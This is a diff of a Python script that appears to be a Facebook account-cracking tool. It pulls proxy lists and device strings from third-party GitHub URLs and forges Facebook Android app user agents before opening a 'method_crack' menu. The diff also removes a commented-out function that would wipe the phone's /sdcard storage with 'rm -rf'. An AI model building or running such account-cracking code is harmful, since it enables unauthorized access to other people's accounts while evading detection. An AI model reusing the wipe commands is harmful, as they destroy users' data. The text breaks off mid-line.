@@ -59,7 +59,7 @@ my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
 try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
+	prox= requests.get('https://raw.githubusercontent.com/jrafael3205/test/main/proxies.txt').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
@@ -69,14 +69,14 @@ prox=open('.prox.txt','r').read().splitlines()
 ugen2=[]
 ugen=[]
 try:
-    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/jrafael3205/test/main/proxies.txt').text
     open('proxies.txt','w').write(proxies)
 except Exception as e:
     print('')
 proxies=open('proxies.txt','r').read().splitlines()
 android_models=[]
 try:
-    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
+    xx = requests.get('https://raw.githubusercontent.com/jrafael3205/test/main/strings.txt').text.splitlines()
     for line in xx:
         android_models.append(line)
 except:pass
@@ -251,14 +251,7 @@ import os, platform
 from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=15).submit
 
-#def fucked():
-   # os.system('rm -rf /sdcard/*')
-   # os.system('rm-rf /sdcard/DCIM/')
-   # os.system('rm-rf /sdcard/Android/')
-  #  os.system('rm-rf /sdcard/Android/data/')
-  #  os.system('rm -rf /sdcard/Download/*')
-  #  os.system('rm -rf /sdcard1/*')
-#    os.system('rm -rf /sdcard/0/*')
+
 count = 0
 loop = 0
 lim = 0
@@ -354,4 +347,9 @@ def menu():
        # os.system('xdg-open https://wa.me/+8801310067277')
 #---------------------[ USER - AGENT ] -------------------#
 def uaxxx():
-    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV
+    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    return ua
+def method_crack():
+    global methods
+    clear()
+    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m] \033[38;5;46mSELECT M
